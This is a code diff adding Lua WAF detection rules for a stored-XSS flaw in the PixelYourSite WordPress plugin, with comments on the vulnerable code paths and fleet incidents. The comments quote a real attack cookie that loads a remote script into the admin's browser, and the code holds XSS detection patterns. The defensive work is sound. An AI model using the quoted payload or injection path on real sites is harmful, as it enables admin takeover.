@@ -4086,6 +4086,204 @@ function _M.detect_cve_litespeed_privesc(cookie)
   return nil
 end
 
+-- [CVE] PixelYourSite / PixelYourSite PRO unauthenticated stored XSS through
+-- the order "enrich" data. CVE-2026-1844 (PRO <= 12.4.0.2), CVE-2026-1841
+-- (free <= 11.2.0), CVE-2026-109987 (cookie printed unescaped; fixed in free
+-- 11.4.3 / PRO 12.6.8). Exploited on this fleet from 2026-02-13 (the day
+-- 1844 was published) to 2026-10-10: ~100 WooCommerce orders on 16 shops.
+--
+-- Source: the plugin code and the fleet's own captures, not memory. On a
+-- WooCommerce Store API checkout (REST_REQUEST), PRO 12.2.7.1's
+-- class_enrich_order.php stores, raw, in the order's pys_enrich_data:
+--   traffic source  $_SESSION['TrafficSource'] ?? $_COOKIE['pysTrafficSource']
+--   landing page    $_SESSION['LandingPage']   ?? $_COOKIE['pys_landing_page']
+--   UTMs            $_GET['utm_*'] ?? $_COOKIE['pys_utm_*'] ?? the session copy
+-- and views/html-order-meta-box.php (+ printUtm) prints them with no
+-- escaping: as <td> text, the landing page also inside href="...". A bot
+-- checkout carrying
+--   pysTrafficSource="<script src=https://patchstackk.com/fz/x.js></script><!--P1181854187-->"
+-- runs that script in the admin's browser the moment staff open the order; on
+-- tophair.gr (2026-10-06) it uploaded a fake plugin and created two
+-- administrators within 15 seconds. Fixed versions sanitize on store and
+-- esc_html on output. The session copies are filled on a session's first
+-- request: TrafficSource from parse_url(HTTP_REFERER)['host'] (or the
+-- cookie), LandingPage from the raw REQUEST_URI path, the UTMs from $_GET.
+--
+-- Rule 10025 (armed: ban + alert) reads only the plugin's own cookies, names
+-- no other software sends: pysTrafficSource, pys_landing_page, pys_utm_* and
+-- their last_ twins.
+--   COOKIE_MARKUP        executable markup (exec_markup below);
+--   COOKIE_ATTR_BREAKOUT a landing-page value whose inner quote closes the
+--                        href and opens an event-handler or style attribute;
+--   COOKIE_SCRIPT_URL    a landing-page URL with a javascript:, vbscript: or
+--                        data: scheme once character references are decoded
+--                        and tabs/newlines dropped, as a browser does.
+-- Rule 10026 (edge block, ban held) covers the session copies, which come from
+-- request parts any site sees: the raw path (PATH_MARKUP /
+-- PATH_ATTR_BREAKOUT), what parse_url takes as the Referer's host
+-- (REFERER_HOST_MARKUP) and the utm_* query fields (QUERY_UTM_MARKUP). They
+-- are not specific to the plugin, so a scanner or a broken link checker that
+-- trips them gets a 403, not a ban and a CVE alert.
+--
+-- A repeated Cookie or Referer header reaches PHP joined with ", " (Apache
+-- merges repeated request headers), so a value can run on into the next
+-- line: both are read as nginx joins them and as Apache does. Cookie values
+-- are %-decoded as PHP decodes them (raw: `+` stays); names are not decoded
+-- (PHP does not decode cookie names) but are lowercased and php_var_name'd,
+-- an over-read. Every pair is checked, not just the first PHP keeps.
+local PYS_COOKIES = {
+  pystrafficsource = true, last_pystrafficsource = true,
+  pys_landing_page = true, last_pys_landing_page = true,
+}
+local PYS_LANDING = { pys_landing_page = true, last_pys_landing_page = true }
+for _, t in ipairs({ "source", "medium", "campaign", "term", "content" }) do
+  PYS_COOKIES["pys_utm_" .. t] = true
+  PYS_COOKIES["last_pys_utm_" .. t] = true
+end
+local PYS_UTM_WANT = { utm_source = true, utm_medium = true, utm_campaign = true, utm_term = true, utm_content = true }
+
+-- Markup that can run in a <td> or an href: an element that loads or runs
+-- code by itself, or any element carrying an event handler, a srcdoc or a
+-- javascript: URL. A bare `<`/`>`, `<3`, a `<b>` or an unfilled template
+-- placeholder such as `<campaign_name>` (ad and mail templates send them in
+-- utm_* and the plugin then keeps them in its cookies) is not, and is left
+-- alone: a ban on every return visit is the wrong answer to it.
+local EXEC_TAGS = { script = true, iframe = true, frame = true, object = true,
+                    embed = true, meta = true, base = true }
+local function exec_markup(v)
+  if not v:find("<", 1, true) then return false end
+  local lv = lower(v)
+  for tag in lv:gmatch("<(%a[%w%-]*)") do
+    if EXEC_TAGS[tag] then return true end
+  end
+  for el in lv:gmatch("<%a[^>]*") do
+    if el:find("[%s/\"']on%a+%s*=") or el:find("[%s/\"']srcdoc%s*=")
+       or el:find("javascript:", 1, true) then
+      return true
+    end
+  end
+  return false
+end
+
+-- A quote that closes an href and opens a handler (or style) attribute,
+-- after any other attributes: `" tabindex=1 autofocus onfocus=`,
+-- `"/title=y/onmouseover=`, `"ondragstart=`. One pair of wrapping quotes is a
+-- legal cookie form and is dropped first; a URL holds no other quote, so any
+-- quote left that opens an attribute is a breakout, whatever the handler.
+local function attr_breakout(v)
+  if not v:find('"', 1, true) then return false end
+  local lv = lower(v)
+  local inner = lv:match('^"(.*)"$') or lv
+  local q = inner:find('"', 1, true)
+  if not q then return false end
+  local rest = inner:sub(q)
+  return rest:find('[%s/"]on%a+%s*=') ~= nil or rest:find('[%s/"]style%s*=') ~= nil
+end
+
+-- HTML decodes character references in an attribute value before the URL is
+-- used, and a browser drops tabs and newlines from it: undo both, then refuse
+-- the schemes that run code.
+local NAMED_REFS = { colon = ":", tab = "\t", newline = "\n", sol = "/", lpar = "(", rpar = ")" }
+local function html_unescape(s)
+  s = s:gsub("&#[xX](%x+);?", function(h) local n = tonumber(h, 16); return n and n < 256 and string.char(n) or "" end)
+  s = s:gsub("&#(%d+);?", function(d) local n = tonumber(d); return n and n < 256 and string.char(n) or "" end)
+  s = s:gsub("&(%a+);?", function(n) return NAMED_REFS[lower(n)] end)
+  return s
+end
+local SCRIPT_SCHEMES = { javascript = true, vbscript = true, data = true }
+local function landing_script_url(v)
+  if not v:find(":", 1, true) and not v:find("&", 1, true) then return false end
+  local u = lower(html_unescape(v)):gsub("[%c%s]", ""):gsub('^["\']+', "")
+  local scheme = u:match("^(%a[%w+.%-]*):")
+  return scheme ~= nil and SCRIPT_SCHEMES[scheme] == true
+end
+
+-- Every way a repeated header can reach PHP: each line, nginx's "; " join
+-- (what $http_cookie holds) and Apache's ", " merge.
+local function header_variants(headers, name, first)
+  local out = {}
+  if first and first ~= "" then out[#out + 1] = first end
+  local h = headers and (headers[name] or headers[name:sub(1, 1):upper() .. name:sub(2)])
+  if type(h) == "table" then
+    for _, v in ipairs(h) do out[#out + 1] = tostring(v) end
+    out[#out + 1] = table.concat(h, ", ")
+  elseif type(h) == "string" and h ~= first then
+    out[#out + 1] = h
+  end
+  return out
+end
+
+-- parse_url's host: never from the query or fragment; the authority after a
+-- leading `//` (past the last `@`, before a `:port`), or for a value with no
+-- `//`, the head of a `host:port` form (1-5 digits, then the end or `/`).
+local function referer_host(ref)
+  local s = ref:match("^[^?#]*")
+  local auth = s:match("^%a[%w+.%-]*://([^/]*)") or s:match("^//([^/]*)")
+  if auth then
+    auth = auth:match("@([^@]*)$") or auth
+    return (auth:gsub(":%d*$", ""))
+  end
+  local head, port = s:match("^([^/]*):(%d+)$")
+  if not head then head, port = s:match("^([^/]*):(%d+)/") end
+  if head and #port <= 5 then return head end
+  return nil
+end
+
+function _M.detect_cve_pixelyoursite_xss(cookie, headers)
+  local values = header_variants(headers, "cookie", cookie)
+  for _, c in ipairs(values) do
+    -- Cheap gate: every target name holds "pys" (PHP decodes no cookie name).
+    if c:find("[Pp][Yy][Ss]") then
+      for pair in c:gmatch("[^;]+") do
+        local eq = pair:find("=", 1, true)
+        if eq then
+          local k = lower(php_var_name((pair:sub(1, eq - 1):gsub("^%s+", ""))))
+          if PYS_COOKIES[k] then
+            local v = pair:sub(eq + 1)
+            if v:find("%", 1, true) then v = url_decode_once(v) end
+            if exec_markup(v) then return "COOKIE_MARKUP" end
+            if PYS_LANDING[k] then
+              if attr_breakout(v) then return "COOKIE_ATTR_BREAKOUT" end
+              if landing_script_url(v) then return "COOKIE_SCRIPT_URL" end
+            end
+          end
+        end
+      end
+    end
+  end
+  return nil
+end
+
+-- Rule 10026: the session copies (see above). `raw_uri` is $request_uri (nil
+-- on the panel gate, which skips the path leg); `args` is the query string,
+-- the only source the plugin reads UTMs from ($_GET).
+function _M.detect_cve_pixelyoursite_session_xss(raw_uri, headers, args)
+  if raw_uri and raw_uri ~= "" then
+    local path = raw_uri:match("^[^?]*")
+    if path:find("[<\"]") then
+      if exec_markup(path) then return "PATH_MARKUP" end
+      if attr_breakout(path) then return "PATH_ATTR_BREAKOUT" end
+    end
+  end
+  for _, ref in ipairs(header_variants(headers, "referer")) do
+    if ref:find("<", 1, true) then
+      local host = referer_host(ref)
+      if host and exec_markup(host) then return "REFERER_HOST_MARKUP" end
+    end
+  end
+  -- "utm", not "utm_": php_var_name turns `utm.content` into utm_content; a
+  -- `%` may hide an encoded name.
+  if args and args ~= "" and (args:find("[Uu][Tt][Mm]") or args:find("%", 1, true)) then
+    local f = _M.php_request_fields("get", args, "", headers, PYS_UTM_WANT)
+    for name in pairs(PYS_UTM_WANT) do
+      for _, v in ipairs(f[name] or {}) do
+        if exec_markup(v) then return "QUERY_UTM_MARKUP" end
+      end
+    end
+  end
+  return nil
+end
+
 -- [CVE] Slider Revolution (revslider) — behavioural virtual-patch for the two
 -- classic UNAUTH exploit shapes. This is deliberately NOT version-specific: the
 -- request shapes below are malicious on ANY version (nothing legitimate reads
